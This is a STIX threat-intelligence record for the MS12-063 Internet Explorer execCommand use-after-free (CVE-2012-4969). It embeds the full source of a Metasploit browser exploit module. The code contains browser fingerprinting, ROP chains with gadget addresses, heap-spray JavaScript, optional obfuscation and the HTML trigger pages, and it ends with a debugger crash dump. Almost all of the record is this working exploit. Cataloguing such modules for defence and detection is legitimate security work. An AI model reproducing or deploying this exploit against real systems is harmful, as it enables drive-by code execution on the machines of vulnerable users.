{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cdc964d7-3338-4b12-bc24-d834becae1e9",
    "created": "2024-08-14T16:39:57.231989Z",
    "modified": "2024-08-14T16:39:57.231992Z",
    "name": "\"MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability \"",
    "description": " This module exploits a vulnerability found in Microsoft Internet Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object gets deleted in an unexpected manner but the same memory is reused again later in the CMshtmlEd::Exec() function, leading to a use-after-free condition.  Please note that this vulnerability has been exploited in the wild since Sep 14 2012.  Also note that presently, this module has some target dependencies for the ROP chain to be valid. For WinXP SP3 with IE8, msvcrt must be present (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, JRE 1.6.x or below must be installed (which is often the case).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ie_execcommand_uaf.rb",
            "external_id": "ie_execcommand_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4969"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/security/advisory/2757760"
        },
        {
            "source_name": "reference",
            "url": "http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  include Msf::Exploit::Remote::BrowserAutopwn\n  autopwn_info({\n    :ua_name    => HttpClients::IE,\n    :ua_minver  => \"7.0\",\n    :ua_maxver  => \"9.0\",\n    :javascript => true,\n    :rank       => GoodRanking\n  })\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability \",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Microsoft Internet Explorer (MSIE). When\n        rendering an HTML page, the CMshtmlEd object gets deleted in an unexpected manner,\n        but the same memory is reused again later in the CMshtmlEd::Exec() function, leading\n        to a use-after-free condition.\n\n        Please note that this vulnerability has been exploited in the wild since Sep 14 2012.\n\n        Also note that presently, this module has some target dependencies for the ROP chain to be\n        valid. For WinXP SP3 with IE8, msvcrt must be present (as it is by default).\n        For Vista or Win7 with IE8, or Win7 with IE9, JRE 1.6.x or below must be installed (which\n        is often the case).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'unknown',     # via ZDI\n          'eromang',     # First public discovery\n          'binjo',\n          'sinn3r',      # Metasploit\n          'juan vazquez' # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-4969' ],\n          [ 'OSVDB', '85532' ],\n          [ 'MSB', 'MS12-063' ],\n          [ 'URL', 'http://technet.microsoft.com/en-us/security/advisory/2757760' ],\n          [ 'URL', 'http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/' ]\n        ],\n      'Payload'        =>\n        {\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5fa', 'Random' => false } ],\n          [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4', 'Random' => false } ],\n          [ 'IE 7 on Windows Vista',  { 'Rop' => nil,     'Offset' => '0x5fa', 'Random' => false } ],\n          [ 'IE 8 on Windows Vista',  { 'Rop' => :jre,    'Offset' => '0x5f4', 'Random' => false } ],\n          [ 'IE 8 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5f4', 'Random' => false } ],\n          [ 'IE 9 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5fc', 'Random' => true } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-09-14',  # When it was spotted in the wild by eromang\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        vprint_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\")[0].to_i\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\")[0].to_i\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n\n    # No rop. Just return the payload.\n    return code if t['Rop'].nil?\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t['Rop']\n    when :msvcrt\n      print_status(\"Using msvcrt ROP\")\n      exec_size = code.length\n      stack_pivot = [\n        0x77c4e393, # RETN\n        0x77c4e392, # POP EAX # RETN\n        0x77c15ed5, # XCHG EAX, ESP # RETN\n      ].pack(\"V*\")\n      rop_payload = generate_rop_payload('msvcrt', code, {'pivot'=>stack_pivot, 'target'=>'xp'})\n\n    else\n      print_status(\"Using JRE ROP\")\n      exec_size = 0xffffffff - code.length + 1\n      if t['Random']\n        stack_pivot = [\n          0x0c0c0c0c, # 0c0c0c08\n          0x7c347f98, # RETN\n          0x7c347f97, # POP EDX # RETN\n          0x7c348b05  # XCHG EAX, ESP # RET\n        ].pack(\"V*\")\n      else\n        stack_pivot = [\n          0x7c347f98, # RETN\n          0x7c347f97, # POP EDX # RETN\n          0x7c348b05  # XCHG EAX, ESP # RET\n        ].pack(\"V*\")\n      end\n      rop_payload = generate_rop_payload('java', code, {'pivot'=>stack_pivot})\n    end\n\n    return rop_payload\n  end\n\n  # Spray published by corelanc0d3r\n  # Exploit writing tutorial part 11 : Heap Spraying Demystified\n  # See https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/\n  def get_random_spray(t, js_code, js_nops)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n\n    function randomblock(blocksize)\n    {\n      var theblock = \"\";\n      for (var i = 0; i < blocksize; i++)\n      {\n        theblock += Math.floor(Math.random()*90)+10;\n      }\n      return theblock;\n    }\n\n    function tounescape(block)\n    {\n      var blocklen = block.length;\n      var unescapestr = \"\";\n      for (var i = 0; i < blocklen-1; i=i+4)\n      {\n        unescapestr += \"%u\" + block.substring(i,i+4);\n      }\n      return unescapestr;\n    }\n\n    var heap_obj = new heapLib.ie(0x10000);\n\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n\n    var offset_length = #{t['Offset']};\n\n    for (var i=0; i < 0x1000; i++) {\n      var padding = unescape(tounescape(randomblock(0x1000)));\n      while (padding.length < 0x1000) padding+= padding;\n      var junk_offset = padding.substring(0, offset_length);\n      var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);\n      while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;\n      sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);\n      heap_obj.alloc(sprayblock);\n    }\n\n    JS\n\n    return spray\n  end\n\n  def get_spray(t, js_code, js_nops)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{t['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n\n    for (var i=1; i < 0x300; i++) {\n      heap_obj.alloc(block);\n    }\n    JS\n  end\n\n\n  def load_html1(cli, my_target)\n    p = get_payload(my_target, cli)\n\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n    js_r_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n\n    if my_target['Random']\n      js = get_random_spray(my_target, js_code, js_r_nops)\n    else\n      js = get_spray(my_target, js_code, js_nops)\n    end\n\n    js = heaplib(js, {:noobfu => true})\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    html = %Q|\n    <html>\n      <body>\n        <script>\n          var arrr = new Array();\n          arrr[0] = window.document.createElement(\"img\");\n          arrr[0][\"src\"] = \"#{Rex::Text.rand_text_alpha(1)}\";\n        </script>\n\n        <iframe src=\"#{this_resource}/#{@html2_name}\"></iframe>\n        <script>\n          #{js}\n        </script>\n      </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def load_html2\n    html = %Q|\n    <HTML>\n      <script>\n        function funcB() {\n          document.execCommand(\"selectAll\");\n        };\n\n        function funcA() {\n          document.write(\"#{Rex::Text.rand_text_alpha(1)}\");\n          parent.arrr[0].src = \"YMjf\\\\u0c08\\\\u0c0cKDogjsiIejengNEkoPDjfiJDIWUAzdfghjAAuUFGGBSIPPPUDFJKSOQJGH\";\n        }\n\n      </script>\n      <body onload='funcB();' onselect='funcA()'>\n        <div contenteditable='true'>\n          a\n        </div>\n      </body>\n    </HTML>\n    |\n\n    return html\n  end\n\n  def this_resource\n    r = get_resource\n    return ( r == '/') ? '' : r\n  end\n\n  def on_request_uri(cli, request)\n    uri       = request.uri\n    agent     = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    vprint_status(\"Requesting: #{uri}\")\n    print_status(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported, sending a 404: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    if uri =~ /#{@html2_name}/\n      print_status(\"Loading #{@html2_name}\")\n      html = load_html2\n    elsif uri =~ /#{@html1_name}/\n      print_status(\"Loading #{@html1_name}\")\n      html = load_html1(cli, my_target)\n    elsif uri =~ /\\/$/ or (!this_resource.empty? and uri =~ /#{this_resource}$/)\n      print_status(\"Redirecting to #{@html1_name}\")\n      send_redirect(cli, \"#{this_resource}/#{@html1_name}\")\n      return\n    else\n      send_not_found(cli)\n      return\n    end\n\n    html = html.gsub(/^ {4}/, '')\n\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n\n  end\n\n  def exploit\n    @html1_name = \"#{Rex::Text.rand_text_alpha(5)}.html\"\n    @html2_name = \"#{Rex::Text.rand_text_alpha(6)}.html\"\n    super\n  end\nend\n\n\n=begin\n0:008> r\neax=00000000 ebx=0000001f ecx=002376c8 edx=0000000d esi=00000000 edi=0c0c0c08\neip=637d464e esp=020bbe80 ebp=020bbe8c iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nmshtml!CMshtmlEd::Exec+0x134:\n637d464e 8b07            mov     eax,dword ptr [edi]  ds:0023:0c0c0c08=????????\n\n0:008> u\nmshtml!CMshtmlEd::Exec+0x134:\n637d464e 8b07            mov     eax,dword ptr [edi]\n637d4650 57              push    edi\n637d4651 ff5008          call    dword ptr [eax+8]\n\n0:008> k\nChildEBP RetAddr\n020bbe8c 637d4387 mshtml!CMshtmlEd::Exec+0x134\n020bbebc 637be2fc mshtml!CEditRouter::ExecEditCommand+0xd6\n020bc278 638afda7 mshtml!CDoc::ExecHelper+0x3c91\n020bc298 638ee2a9 mshtml!CDocument::Exec+0x24\n020bc2c0 638b167b mshtml!CBase::execCommand+0x50\n020bc2f8 638e7445 mshtml!CDocument::execCommand+0x93\n020bc370 636430c9 mshtml!Method_VARIANTBOOLp_BSTR_oDoVARIANTBOOL_o0oVARIANT+0x149\n020bc3e4 63643595 mshtml!CBase::ContextInvokeEx+0x5d1\n020bc410 63643832 mshtml!CBase::InvokeEx+0x25\n020bc460 635e1cdc mshtml!DispatchInvokeCollection+0x14b\n020bc4a8 63642f30 mshtml!CDocument::InvokeEx+0xf1\n020bc4d0 63642eec mshtml!CBase::VersionedInvokeEx+0x20\n020bc520 633a6d37 mshtml!PlainInvokeEx+0xea\n020bc560 633a6c75 jscript!IDispatchExInvokeEx2+0xf8\n020bc59c 633a9cfe jscript!IDispatchExInvokeEx+0x6a\n020bc65c 633a9f3c jscript!InvokeDispatchEx+0x98\n020bc690 633a77ff jscript!VAR::InvokeByName+0x135\n020bc6dc 633a85c7 jscript!VAR::InvokeDispName+0x7a\n020bc708 633a9c0b jscript!VAR::InvokeByDispID+0xce\n020bc8a4 633a5ab0 jscript!CScriptRuntime::Run+0x2989\n=end\n",
    "x_mitre_disclosure_date": "2012-09-14,  # When it was spotted in the wild by eromang",
    "x_mitre_platforms": [
        "win'"
    ]
}